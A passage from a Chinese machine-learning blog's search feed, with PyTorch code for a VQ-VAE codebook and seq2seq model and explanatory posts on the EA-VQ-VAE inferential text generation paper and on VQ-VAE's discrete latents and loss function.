<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CodeBook</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, num_embeddings, embedding_dim, commitment_cost</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CodeBook, self).__init__()  </span><br><span class="line">        self._embedding_dim = embedding_dim</span><br><span class="line">        self._num_embeddings = num_embeddings     </span><br><span class="line">        self._embedding = nn.Embedding(self._num_embeddings, self._embedding_dim)      </span><br><span class="line">        self._commitment_cost = commitment_cost</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        <span class="comment"># Calculate distances</span></span><br><span class="line">        distances = (torch.<span class="built_in">sum</span>(inputs**<span class="number">2</span>, dim=<span class="number">1</span>, keepdim=<span class="literal">True</span>) </span><br><span class="line">                    + torch.<span class="built_in">sum</span>(self._embedding.weight**<span class="number">2</span>, dim=<span class="number">1</span>)</span><br><span class="line">                    - <span class="number">2</span> * torch.matmul(inputs, self._embedding.weight.t()))</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># Encoding</span></span><br><span class="line">        encoding_indices = torch.argmin(distances, dim=<span class="number">1</span>).unsqueeze(<span class="number">1</span>)</span><br><span class="line">        encodings = torch.zeros(encoding_indices.shape[<span class="number">0</span>], self._num_embeddings).cuda()</span><br><span class="line">        encodings.scatter_(<span class="number">1</span>, encoding_indices, <span class="number">1</span>) <span class="comment"># 离散隐变量索引 [batch_size,num_embeddings]</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Quantize and unflatten</span></span><br><span class="line">        quantized = torch.matmul(encodings, self._embedding.weight) <span class="comment">## 乘法获得隐变量</span></span><br><span class="line">        <span class="comment"># 整个隐变量的获取方法有点复杂了，argmin之后直接查询embedding即可，无需手动操作。这里这样处理是为了后续</span></span><br><span class="line">        <span class="comment"># 还要计算perplexity</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Loss</span></span><br><span class="line">        <span class="comment"># detach()从计算图中脱离，达到stop gradient的目的</span></span><br><span class="line">        e_latent_loss = torch.mean((quantized.detach() - inputs)**<span class="number">2</span>) </span><br><span class="line">        q_latent_loss = torch.mean((quantized - inputs.detach())**<span class="number">2</span>)</span><br><span class="line">        loss = q_latent_loss + self._commitment_cost * e_latent_loss</span><br><span class="line">        </span><br><span class="line">        quantized = inputs + (quantized - inputs).detach()</span><br><span class="line">        avg_probs = torch.mean(encodings, dim=<span class="number">0</span>)</span><br><span class="line">        perplexity = torch.exp(-torch.<span class="built_in">sum</span>(avg_probs * torch.log(avg_probs + <span class="number">1e-10</span>)))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># convert quantized from BHWC -&gt; BCHW</span></span><br><span class="line">        <span class="keyword">return</span> loss, quantized, perplexity, encodings</span><br></pre></td></tr></tbody></table></figure>
<p>整个代码是比较清晰的。在初始化中根据传入参数初始化嵌入空间，并保存了 commitment cost。commitment cost 指的是 VQ-VAE 损失函数的第三项的权重<span class="math inline"> \(\beta\)</span>。由论文可知，CodeBook 的前向过程应该是输入编码器输出<span class="math inline"> \(z_e(x)\)</span>，输出最近的隐变量<span class="math inline"> \(z\)</span>。那么代码中 inputs 的 shape 应该为 [batch_size，embedding_dim]，进而距离的计算过程就很自然了。其他见代码的注释部分。</p>
<p>接下来是 seq2seq 模型：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Build Seqence-to-Sequence.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Parameters:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        * `encoder`- encoder of seq2seq model. e.g. 2-layer transformer</span></span><br><span class="line"><span class="string">        * `decoder`- decoder of seq2seq model. e.g. GPT2</span></span><br><span class="line"><span class="string">        * `config`- configuration of encoder model. </span></span><br><span class="line"><span class="string">        * `args`- arguments.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, encoder,decoder,config,args</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Model, self).__init__()</span><br><span class="line">        self.encoder = encoder</span><br><span class="line">        self.decoder=decoder</span><br><span class="line">        self.config=config</span><br><span class="line">        self.args=args</span><br><span class="line">        </span><br><span class="line">        self.lm_head = nn.Linear(config.hidden_size, config.vocab_size, bias=<span class="literal">False</span>)      </span><br><span class="line">        self.codebook = CodeBook(args.z_size, config.n_embd,<span class="number">0.25</span>)  </span><br><span class="line">        self.codebook._embedding.weight.data.normal_(mean=<span class="number">0</span>,std=<span class="number">0.1</span>)</span><br><span class="line">        self.lsm = nn.LogSoftmax(dim=-<span class="number">1</span>)</span><br><span class="line">        self.lm_head.weight=self.decoder.wte.weight     </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, event_ids,target_ids</span>):</span>   </span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">            Forward the VQ-VAE model.</span></span><br><span class="line"><span class="string">            Parameters:</span></span><br><span class="line"><span class="string">            * `event_ids`- event ids of examples</span></span><br><span class="line"><span class="string">            * `target_ids`- target ids of examples</span></span><br><span class="line"><span class="string">        """</span>  </span><br><span class="line">        input_ids=torch.cat((event_ids,target_ids),-<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#obtain hidden of event+target by encoder</span></span><br><span class="line">        hidden_xy=self.encoder(input_ids,special=<span class="literal">True</span>)[<span class="number">0</span>][:,-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#obtain latent variable z by coodebook</span></span><br><span class="line">        vae_loss, z, perplexity, encoding=self.codebook(hidden_xy)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#obtain hiddens of target </span></span><br><span class="line">        transformer_outputs=self.decoder(input_ids,z=z)</span><br><span class="line">        hidden_states = transformer_outputs[<span class="number">0</span>][:,-target_ids.size(<span class="number">1</span>):]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#calculate loss</span></span><br><span class="line">        lm_logits = self.lm_head(hidden_states+z[:,<span class="literal">None</span>,:])</span><br><span class="line">        <span class="comment"># Shift so that tokens &lt; n predict n</span></span><br><span class="line">        active_loss = target_ids[..., <span class="number">1</span>:].ne(<span class="number">0</span>).view(-<span class="number">1</span>) == <span class="number">1</span> <span class="comment"># 将推理文本展平并得到非0位置的索引，用以计算loss</span></span><br><span class="line">        shift_logits = lm_logits[..., :-<span class="number">1</span>, :].contiguous() <span class="comment"># 去除末尾的EOS</span></span><br><span class="line">        shift_labels = target_ids[..., <span class="number">1</span>:].contiguous() <span class="comment"># </span></span><br><span class="line">        <span class="comment"># Flatten the tokens</span></span><br><span class="line">        loss_fct = CrossEntropyLoss(ignore_index=-<span class="number">1</span>)</span><br><span class="line">        loss = loss_fct(shift_logits.view(-<span class="number">1</span>, shift_logits.size(-<span class="number">1</span>))[active_loss],</span><br><span class="line">                        shift_labels.view(-<span class="number">1</span>)[active_loss])</span><br><span class="line"></span><br><span class="line">        outputs = (loss,vae_loss,perplexity),loss*active_loss.<span class="built_in">sum</span>(),active_loss.<span class="built_in">sum</span>(),encoding</span><br><span class="line">        <span class="keyword">return</span> outputs</span><br></pre></td></tr></tbody></table></figure>
<p>init 方法比较简单，只是保存参数和新建 codebook。前向过程也比较简单：训练阶段，seq2seq 的输入是事件和推理文本的拼接，然后进行编码和解码（这里编码器为 2 层 Transformer，解码器为预训练的 GPT 模型）。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>文本生成</category>
      </categories>
      <tags>
        <tag>VQ-VAE</tag>
      </tags>
  </entry>
  <entry>
    <title>推理文本生成 | EA-VQ-VAE</title>
    <url>/blog/2021/07/16/ea-vq-vae/</url>
    <content><![CDATA[<h2 id="题外话">题外话</h2>
<p>今天是我的生日，希望能看到这篇博客的你天天开心。如果今天还恰好是你的生日，希望你生日快乐！</p>
<h2 id="简介">简介</h2>
<p>EA-VQ-VAE 是微软团队于 2020 年发表的《Evidence-Aware Inferential Text Generation with Vector Quantised Variational AutoEncoder》中提出的模型，该文发表在 ACL 上。该文的主要工作是利用 VQ-VAE 进行推理文本生成。推理文本生成定义为，给定一个事件（例如 “A 偷看了 B 的日记”），从多个维度对该事件进行推断（“A 的心理状态”，“A 的目的”）。而 EA-VQ-VAE 中的 EA（Evidence-Aware）指的是利用证据来进行推理文本生成。</p>
<span id="more"></span>
<h2 id="实现方法">实现方法</h2>
<p>下图展示了整个模型的流程：给定事件<span class="math inline"> \(x\)</span> 后，经过 VQ-VAE 将其映射为离散的隐变量<span class="math inline"> \(z\)</span>，根据事件<span class="math inline"> \(x\)</span> 从文本语料中检索证据，再一起投喂给解码器输出最终的推理文本<span class="math inline"> \(y\)</span>。下面逐项介绍模型的细节。</p>
<p><img src="model.png"></p>
<h3 id="vq-vae">VQ-VAE</h3>
<p>VQ-VAE 的详细介绍可以看我的上一篇博客。论文使用的 VQ-VAE 与标准的 VQ-VAE 最主要的区别在于，普通的 VQ-VAE 生成是数据<span class="math inline"> \(x\)</span>，而在推理文本生成任务中，生成的是以符合事件<span class="math inline"> \(x\)</span> 的推理文本<span class="math inline"> \(y\)</span>，换而言之，这是一个<strong>条件模型</strong>，叫它 VQ-CVAE 可能更恰当一点。基于此，下面所述的后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span> 与先验分布<span class="math inline"> \(p_\theta(z|x)\)</span> 均与标准的 VQ-VAE 有所不同。</p>
<p>本文使用的 VQ-VAE 分为以下三个部分：</p>
<ul>
<li>codebook：对应 VQ-VAE 中的隐变量嵌入空间，只是换了个名字，同样是一张<span class="math inline"> \(R^{k*d}\)</span> 的表，由<span class="math inline"> \(k\)</span> 个维度为<span class="math inline"> \(d\)</span> 的隐变量组成</li>
<li>后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span>：同样是一个独热分布，使用最近邻算法将编码器输出<span class="math inline"> \(h_(x,y)\)</span> 映射到最近的隐变量<span class="math inline"> \(z'\)</span></li>
<li> 先验分布<span class="math inline"> \(p_\theta(z|x)\)</span>：先利用预训练的语言模型（例如 RoBERTa）将事件编码为隐藏状态<span class="math inline"> \(h\)</span>，，再将其映射为 k 个类别，即<span class="math inline"> \(p_\theta(z|x)=softmax(hW_k)\)</span></li>
</ul>
<h3 id="证据的检索与选择">证据的检索与选择</h3>
<p>去除事件中的停用词后，在大规模文本语料中使用 Elastic Search 引擎检索事件，并选取前 K 个得分最高的句子。论文使用的语料库基于 BookCorpus，由一万多篇故事书组成，因为作者认为故事中会对事件的起因和结果介绍地较为清晰。</p>
<p>证据的选择与隐变量类似，在训练阶段和推理阶段有着不同的逻辑。在训练阶段，事件<span class="math inline"> \(x\)</span> 与推理文本<span class="math inline"> \(y\)</span> 均已知，例如给定事件 “A 读了 B 的日记”，与推理文本 “A 感到很愧疚”，那么证据 “A 偷了 B 的日记” 就比 “B 把日记给 A 看” 更合理，此时我们想要建模的就是<span class="math inline"> \(q(c|x,y)\)</span>（c 代表事件上下文，即证据）与<span class="math inline"> \(p(c|x)\)</span>。考虑到已经有一个后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span>，那么我们可以直接利用隐变量来完成证据的选择，即建模<span class="math inline"> \(p(c|z)\)</span>, 而不是再引入一个复杂的神经网络。对于一组证据（<span class="math inline">\(c_\phi\)</span> 代表填充的空证据）<span class="math inline">\(\{c_1,c_2,\dots,c_K,c_\phi\}\)</span>，使用 Transformer 将其编码为向量<span class="math inline"> \(\{h_{c_1},h_{c_2},\dots,h_{c_K},h_{c_\phi}\}\)</span>。<span class="math inline">\(p_s(c|z)\)</span> 与<span class="math inline"> \(q_\phi(z|x,y)\)</span> 类似，也是一个独热分布，再通过最近邻算法选取最近的证据，即： <span class="math display">\[
p_s(c_k|z)=
\begin{cases}
1 &amp;if\ k=\arg\min_j||h_{c_j}-z||_2 \\
0 &amp;otherwise
\end{cases}
\]</span></p>
<p><span class="math display">\[
c_z=c_k\ where\ k=\arg\min_j||h_{c_j}-z||_2
\]</span></p>
<p>值得注意的是，作者没有使用注意力机制得到的 “软” 分布，而是借鉴 VQ-VAE，采用了一种独热分布将<span class="math inline"> \(z\)</span> 映射到最近的<span class="math inline"> \(c\)</span>。这样的优点是一定程度上降低了学习的难度，由于<span class="math inline"> \(z\)</span> 与<span class="math inline"> \(c\)</span> 处在同一个语义空间，解码器利用起来的效率会更高。而且这样做也更为统一。但我总觉得注意力机制得到的结果会更好一点，论文里没有进行比较属实有点伤。</p>
<h3 id="解码器">解码器</h3>
<p>解码器使用的是预训练的 GPT-2，是一个基于 Transformer 的语言模型。这里就不多赘述了，有兴趣的小伙伴可以去了解一下 GPT 家族。</p>
<h2 id="训练过程">训练过程</h2>
<p>首先单独训练 VQ-VAE 与 codebook，再训练基于后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span> 的证据感知解码器。</p>
<h3 id="vq-vae-1">VQ-VAE</h3>
<p>首先只根据隐变量<span class="math inline"> \(z\)</span> 重构推理文本<span class="math inline"> \(y\)</span>，损失函数与 VQ-VAE 损失函数类似： <span class="math display">\[
loss_{rec}=-logp(y|x,h_{(x,y)}+sg[z-h_{(x,y)}])+||sg[h_{(x,y)}]-z||_2^2+\beta||h_{(x,y)}-sg[z]||_2^2
\]</span></p>
<p>真实的先验分布可以使用频率近似（<span class="math inline">\(N_{(x)}\)</span> 代表包含<span class="math inline"> \(x\)</span> 事件的数据数量）： <span class="math display">\[
p(z|x)=\sum_{(x,y_i)\in D}\frac{q_\phi(z|x,y_i)}{N_{(x)}}
\]</span> 通过 KL 散度来优化先验分布<span class="math inline"> \(p_\theta(z|x)\)</span>: <span class="math display">\[
loss_{prior}=KL(p(z|x)||p_\theta(z|x))
\]</span></p>
<p>不过这里为什么不像 CVAE 一样，直接优化后验分布与先验分布间的 KL 散度，暂时还不是很理解。</p>
<h3 id="证据感知解码器">证据感知解码器</h3>
<p>这一部分通过最大化边际似然进行训练： <span class="math display">\[
\begin{align}
logp(y|x)&amp;=E_{z\sim q_\phi}[\sum_{c\in C}logp_m(y|x,c)p_s(c|z)]\\
&amp;=log(p_m(y|x,c_{z'}))+logp_s(c_{z'}|z')
\end{align}
\]</span> 然而，由于真实的证据是未知的，直接优化上述似然函数可能得不到正确结果。具体而言，与<span class="math inline"> \(z'\)</span> 最近的<span class="math inline"> \(c_{z'}\)</span> 不一定就是真实有用的证据，如果我们已知真实的证据标签<span class="math inline"> \(c\)</span>，损失函数中应该还有一项是<span class="math inline"> \(||c-c_{z'}||_2\)</span>。为解决这个问题，原论文采取了强化学习的方法： <span class="math display">\[
R=\delta(p_m(y|x,c_{z'})-p_m(y|x,c_r))
\]</span></p>
<p><span class="math display">\[
\begin{align}
logp(y|x)&amp;=logp_m(y|x,c_{z'})+Rlogp_s(c_{z'}|z')\\
&amp;=logp_m(y|x,c_{z'})-R|||h_{c_{z'}}-z'||_2^2
\end{align}
\]</span> 其中，<span class="math inline">\(\delta(x)\)</span> 当 x 大于 0 时为 1，否则为 - 1。<span class="math inline">\(c_r\)</span> 为随机选取的与<span class="math inline"> \(c_{z'}\)</span> 不同的证据。这样设计的原因是，正确的证据相较于其他证据应该能够提高生成正确推理文本的概率。当<span class="math inline"> \(R\)</span> 为正时，<span class="math inline">\(logp(y|x)\)</span> 会更大，进而激励模型选择正确的证据。</p>
<h2 id="个案研究">个案研究</h2>
<p><img src="case.png"></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>文本生成</category>
      </categories>
      <tags>
        <tag>VQ-VAE</tag>
      </tags>
  </entry>
  <entry>
    <title>量子变分自编码器 VQ-VAE</title>
    <url>/blog/2021/07/15/vq-vae/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>VQ-VAE（Vector Quantised - Variational AutoEncoder，量子变分自编码器）出自 2017 年 Google 团队的论文 Neural Discrete Representation Learning。顾名思义，VQ-VAE 是 VAE（ Variational AutoEncoder，变分自编码器）的变种。主要是为了解决 VAE 所存在的” 后验坍塌 “问题。VQ-VAE 与 VAE 的主要区别在于：</p>
<ul>
<li>隐变量是离散的，而非连续的</li>
<li>先验分布是学习得来的，而非固定不变的</li>
</ul>
<span id="more"></span>
<h2 id="研究动机与背景">研究动机与背景</h2>
<h3 id="离散型隐变量">离散型隐变量</h3>
<p>离散型隐变量对于某些任务是更为自然与恰当的，例如语言是由离散的字符组成的，图像的像素是 0-255 的自然数。然而，离散 VAE 往往难以训练，现有的训练方法无法弥补其与连续型 VAE 存在的性能上的差距。尽管连续型 VAE 会存在后验坍塌问题，但是由于从高斯分布中使用重参数化技巧采样隐变量，连续型 VAE 中能够获得方差更小，即更稳定的参数梯度。</p>
<h3 id="自回归模型">自回归模型</h3>
<p>自回归模型（<strong>A</strong>uto<strong>r</strong>egressive model）是一种处理时间序列的方法，使用<span class="math inline"> \(x_1,x_2,\dots,x_{t-1}\)</span> 来预测<span class="math inline"> \(x_t\)</span>，并假设它们是线性关系。由于其使用<span class="math inline"> \(x\)</span> 本身来预测<span class="math inline"> \(x\)</span>，因而得名为自回归模型。形式化来讲，自回归模型定义如下： <span class="math display">\[
X_t=c+\sum_{i=1}^p\phi_iX_{t-i}+\epsilon_t
\]</span> 其中，<span class="math inline">\(c\)</span> 是常数项，<span class="math inline">\(\epsilon_t\)</span> 假设为一个均值为 0，标准差为<span class="math inline"> \(\sigma\)</span> 的随机误差。</p>
<p>典型的自回归模型有循环神经网络（Recurrent Neural Network, RNN），PixelCNN 等。下面以文中提到的 PixelCNN 为例进行介绍。</p>
<p>PixelCNN 是虽然是 CNN，但它与传统的 CNN 不同，而是参考了 RNN 的思路，将图片扁平化为一维后，将其看成时间序列进行逐像素的生成。即： <span class="math display">\[
\begin{align}
p(x)&amp;=p(x_1,x_2,\dots,x_t)\\
&amp;=p(x_1)p(x_2|x_1)\dots p(x_t|x_1,x_2,\dots,x_{t-1})
\end{align}
\]</span> 可以看到，符合上述的自回归模型的定义（令<span class="math inline"> \(X_t=p(x_1,x_2,\dots,x_t)\)</span>）。</p>
<h3 id="变分自编码器">变分自编码器</h3>
<p>变分自编码器（Variational AutoEncoder，VAE）是一类重要的生成模型。由于篇幅原因这里只做简单介绍，后面可能会单独出一篇博客介绍。VAE 假设存在一个无法观测的隐变量<span class="math inline"> \(z\)</span> 控制数据<span class="math inline"> \(x\)</span> 的生成，它主要由以下几部分组成：</p>
<ul>
<li>编码网络，拟合后验分布<span class="math inline"> \(q(z|x)\)</span> ，将数据<span class="math inline"> \(x\)</span> 映射到连续隐变量<span class="math inline"> \(z\)</span></li>
<li> 生成网络，拟合分布<span class="math inline"> \(p(x|z)\)</span></li>
<li> 隐变量的先验分布<span class="math inline"> \(p(z)\)</span></li>
</ul>
<p>在训练过程中，从<span class="math inline"> \(q(z|x)\)</span> 中采样隐变量<span class="math inline"> \(z\)</span> 来重构数据。在推理过程中，从<span class="math inline"> \(p(z)\)</span> 中采样隐变量来生成数据。</p>
<h2 id="模型细节">模型细节</h2>
<p>整体结构如下图所示：</p>
<p><img src="model.png"></p>
<h3 id="离散隐变量">离散隐变量</h3>
<p>模型定义了一个<span class="math inline"> \(K*D\)</span> 的隐变量嵌入空间，其中<span class="math inline"> \(K\)</span> 为空间大小，<span class="math inline">\(D\)</span> 为隐变量向量的维度。在得到编码网络的输出<span class="math inline"> \(z_e(x)\)</span> 后，通过<strong>最近邻算法</strong>将其映射为隐变量嵌入空间中的某个隐变量<span class="math inline"> \(e_k\)</span>（简记为<span class="math inline"> \(z\)</span>），投喂到解码器。后验分布<span class="math inline"> \(q(z|x)\)</span> 定义为如下的独热分布： <span class="math display">\[
q(z=k|x) = \begin{cases}
1 &amp;if\ k=\arg\min_j||z_e(x)-e_j|| , \\
0 &amp; otherwise.
\end{cases}
\]</span> 进而： <span class="math display">\[
z_q(x)=e_k, where\ k=\arg\min_j||z_e(x)-e_j||
\]</span></p>
<h3 id="梯度计算">梯度计算</h3>
<p>注意到上述公式中的<span class="math inline"> \(\arg\min\)</span> 操作是无法求梯度的，这使得模型无法进行反向传播。VQ-VAE 采取直通估计（straight-through estimator ）来解决这个问题。原论文中具体做法描述为 <strong>” 将解码器输入<span class="math inline"> \(z_q(x)\)</span> 的梯度复制到解码器的输出<span class="math inline"> \(z_e(x)\)</span>“</strong>。对应上述结构图中的红线。</p>
<h3 id="损失函数">损失函数</h3>
<p>损失函数表示如下： <span class="math display">\[
L=logp(x|z_q(x))+||sg[z_e(x)]-e||_2^2+\beta||z_e(x)-sg[e]||^2_2
\]</span> 其中，<span class="math inline">\(sg\)</span> 代表停止梯度，即反向传播时不再向前计算梯度。这个符号的含义我个人感觉论文解释的有点不清楚，可能需要对照代码进一步看一下。我目前的理解是，在前向传播的时候，sg 是恒等式，即被忽略掉了，此时计算得到的 loss 是真正的 loss。在反向传播时，sg 部分的计算图相当于断开了，以<span class="math inline"> \(||sg[z_e(x)]-e||_2^2\)</span> 为例，前项传播时等价于<span class="math inline"> \(||z_e(x)-e||_2^2\)</span>。反向传播时等价于<span class="math inline"> \(||const-e||_2^2\)</span>，即将<span class="math inline"> \(z_e(x)\)</span> 看做常数，不对其进行优化。</p>
<p>损失函数的各项含义解释如下：</p>
<ul>
<li>第一项为重构损失，用以训练编码器和解码器，个人感觉这里是不是少了个负号，这一部分是似然函数，按理说应该是要最大化的。</li>
<li>第二项为 L2 范数损失函数。通过矢量量化（Vector Quantisation，VQ）学习嵌入空间的字典，即希望编码器的输出<span class="math inline"> \(z_e(x)\)</span> 与最近邻算法得到的<span class="math inline"> \(e\)</span> 距离越近越好，用以优化嵌入空间。</li>
<li>第三项为 L2 范数损失函数。与第二项的区别在于优化的是编码器。原论文中的说法是，由于嵌入空间是无量纲的，当仅存在第二项时，若<span class="math inline"> \(e\)</span> 的参数训练速度慢于编码器参数，会使得<span class="math inline"> \(e\)</span> 的参数向任意方向增长。</li>
</ul>
<p>第二项和第三项本质上都是希望编码器的输出<span class="math inline"> \(z_e(x)\)</span> 与离散化隐变量<span class="math inline"> \(e\)</span> 相互接近，相较于<span class="math inline"> \(||z_e(x)-e||_2^2\)</span>，个人理解这里的设计是为了控制二者的优化速度。如果希望编码器输出相对稳定，则调小<span class="math inline"> \(\beta\)</span>，让嵌入空间更多地靠近编码器的输出，也可以反之。</p>
<p>论文中实验发现<span class="math inline"> \(\beta\)</span> 从 0.1-2.0 都是非常鲁棒的，实验设置<span class="math inline"> \(\beta=0.25\)</span>，可能意味着二者靠近的速度影响不大（这也更符合直观认知）。</p>
<h3 id="先验分布pz">先验分布<span class="math inline"> \(p(z)\)</span></h3>
<p>先验分布<span class="math inline"> \(p(z)\)</span> 是个分类分布（categotical distribution），在训练过程中保持不变。在训练结束后，在隐变量<span class="math inline"> \(z\)</span> 上拟合一个自回归分布，即<span class="math inline"> \(p(z)\)</span>，进而通过祖先采样（ancestral sampling）来生成<span class="math inline"> \(x\)</span>。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/自迴歸模型">自回归模型 - 维基百科，自由的百科全书 (wikipedia.org)</a></li>
</ul>
]]></content>
      <categories>
        <category>生成模型</category>
        <category>VAE</category>
      </categories>
      <tags>
        <tag>VQ-VAE</tag>
        <tag>论文</tag>
      </tags>
  </entry>
</search>
